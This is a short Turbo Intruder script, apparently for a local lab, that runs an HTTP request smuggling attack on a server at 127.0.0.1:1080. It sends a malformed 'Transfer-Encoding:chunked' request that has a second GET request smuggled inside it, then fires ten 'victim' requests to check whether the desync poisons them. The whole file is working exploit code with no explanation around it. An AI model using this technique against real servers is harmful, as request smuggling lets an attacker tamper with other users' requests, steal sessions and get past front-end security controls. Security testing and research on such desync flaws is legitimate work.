def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint='http://127.0.0.1:1080',
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False,
                           maxRetriesPerRequest=0
                           )

    attack = '''POST / HTTP/1.1
Host: 127.0.0.1:1080
Content-Length: 37
Connection: keep-alive
Transfer-Encoding:chunked

1
A
0

GET / HTTP/1.1
X-Foo: bar'''
    engine.queue(attack)
    engine.start()

def handleResponse(req, interesting):
    table.add(req)
    if req.code == 200:
        victim = '''GET / HTTP/1.1
Host: 127.0.0.1:1080
Connection: close

'''

        for i in range(10):
            req.engine.queue(victim)
